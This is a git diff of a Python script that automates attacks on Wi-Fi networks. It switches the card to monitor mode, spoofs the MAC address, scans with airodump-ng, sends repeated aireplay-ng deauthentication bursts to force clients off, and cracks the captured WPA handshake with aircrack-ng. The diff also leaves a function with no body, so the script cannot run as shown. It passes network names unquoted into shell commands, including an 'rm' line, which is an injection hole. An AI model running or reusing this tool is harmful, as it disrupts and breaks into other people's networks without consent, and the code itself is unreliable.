@@ -1,4 +1,4 @@
- #! /usr/bin/python3
+#/usr/bin/python3
 # Program for the device
 # Started August
 # Yordan
@@ -62,7 +62,6 @@ def subprocess_command(command):
 def shutting_down_monitor_mode(name):
     print("Shutting down monitor mode...")
     subprocess_command('airmon-ng stop ' + name)
-    print("Goodbye, little fellow...")
     return
 
 def mac_changer(name):
@@ -82,15 +81,14 @@ def monitor_mode(name,channel='0'):
     return monitor_mode_wlan
 
 def capture_handshake(monitor, point, filtered_clients):
-    subprocess_command('rm hands* raven/temp.lst')
 
-    subprocess_command('echo \"temp\" >> raven/temp.lst')
+    subprocess_command('echo \"temp\" >> temp.lst')
 
     global name_of_wlan
     shutting_down_monitor_mode(monitor)
-    name_of_wlan = monitor_mode(name_of_wlan, point.get_Channel())
+    new_monitor_mode = monitor_mode(name_of_wlan, point.get_Channel())
 
-    argum = 'airodump-ng --bssid ' + point.get_BSSID() + ' -c ' +  point.get_Channel() + ' -w handshake ' + name_of_wlan
+    argum = 'airodump-ng --bssid ' + point.get_BSSID() + ' -c ' +  point.get_Channel() + ' -w ' + point.get_ESSID() +  ' '  + new_monitor_mode
 
     command = subprocess.Popen(argum,  stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
@@ -100,11 +98,11 @@ def capture_handshake(monitor, point, filtered_clients):
 
     while True:
         time.sleep(5)
-        command_process = subprocess.Popen('aireplay-ng  --deauth 10 -a ' + point.get_BSSID() + ' ' +  name_of_wlan + ' --ig',stdout=subprocess.PIPE,
+        command_process = subprocess.Popen('aireplay-ng  --deauth 10 -a ' + point.get_BSSID() + ' ' +  new_monitor_mode + ' --ig',stdout=subprocess.PIPE,
                                                                                                                                                                 shell=True)
         command_process.wait()
         print(command_process.communicate()[0])
-        smth = subprocess.Popen('aircrack-ng -a 2 -w raven/temp.lst -b ' + point.get_BSSID() + ' handshake-01.cap',stdout=subprocess.PIPE,
+        smth = subprocess.Popen('aircrack-ng -a 2 -w temp.lst -b ' + point.get_BSSID() + ' ' + point.get_ESSID() + '-01.cap',stdout=subprocess.PIPE,
                                                                                                                    stderr=subprocess.PIPE,
                                                                                                                    shell=True)
         smth.wait()
@@ -113,8 +111,8 @@ def capture_handshake(monitor, point, filtered_clients):
         if other.decode("utf-8").find("Passphrase not in dictionary") != -1:
             try:
                 os.kill(command.pid, signal.SIGTERM)
-
-                print("Yeah, bby")
+                com = 'rm ' + point.get_ESSID() +'.csv ' + point.get_ESSID() +'.kismet.csv ' + point.get_ESSID() +'.kismet.netxml ' + ' temp.lst'
+                subprocess_command(com)
                 return
             except OSError:
                 pass
@@ -159,11 +157,15 @@ def csv_parser(file_pos):
     return (ap, assoc_clients)
 
 
-def airodump(monitor_mode, file_directory):
-        process = subprocess.Popen('airodump-ng -a -w ' + file_directory + 'raven --output-format csv ' + monitor_mode, stdout=subprocess.PIPE,
-                                                                                                                  stderr=subprocess.PIPE,
-                                                                                                                  shell=True,
-                                                                                                                  preexec_fn=os.setsid)
+def wep_algorithm():
+
+
+
+def airodump(monitor_mode):
+        process = subprocess.Popen('airodump-ng -a -w first_check --output-format csv ' + monitor_mode, stdout=subprocess.PIPE,
+                                                                                                        stderr=subprocess.PIPE,
+                                                                                                        shell=True,
+                                                                                                        preexec_fn=os.setsid)
 
         time.sleep(15)
 
@@ -174,7 +176,9 @@ def airodump(monitor_mode, file_directory):
         except UnboundLocalError:
             pass
 
-        (ap, assoc_clients) = csv_parser(file_directory + 'raven-01.csv')
+        (ap, assoc_clients) = csv_parser('first_check-01.csv')
+
+        subprocess_command('rm first*')
 
         print("Stopped scanning, please wait while gathering information ...")
 
@@ -190,6 +194,7 @@ def airodump(monitor_mode, file_directory):
                         filtered_clients.append(client)
             if is_WEP:
                 print("Algorithm for WEP")
+                wep_algorithm()
             else:
                 if not filtered_clients:
                     print("Cannot run the attack - no clients on the run")
@@ -199,18 +204,8 @@ def airodump(monitor_mode, file_directory):
 
             is_WEP = False
 
-
-def checking_dir(directory):
-    if not os.path.exists(directory):
-        print("Creating dir...")
-        os.makedirs(directory)
-    else:
-        print("You have one...")
-    return directory
-
 try:
 
-    CWD = os.getcwd()
     #First stage - getting the name of the wlan card
     print ("Configuring your wlan card name... Please wait")
     name_of_wlan = subprocess_command('iwconfig 2>&1 | grep IEEE | awk \'{print $1}\'')
@@ -220,16 +215,8 @@ try:
 
     wlan_name = monitor_mode(name_of_wlan)
 
-    #third stage - checking for directory and scanning
-    print("Checking for existing directory...")
-
-    file_directory = checking_dir(CWD + '/raven/')
-
-    if  os.listdir(file_directory):
-        subprocess_command('rm ' + file_directory + 'raven*')
-
     print("Starting scanning...")
-    airodump(wlan_name,file_directory)
+    airodump(wlan_name)
 
     shutting_down_monitor_mode(wlan_name)
 except KeyboardInterrupt:
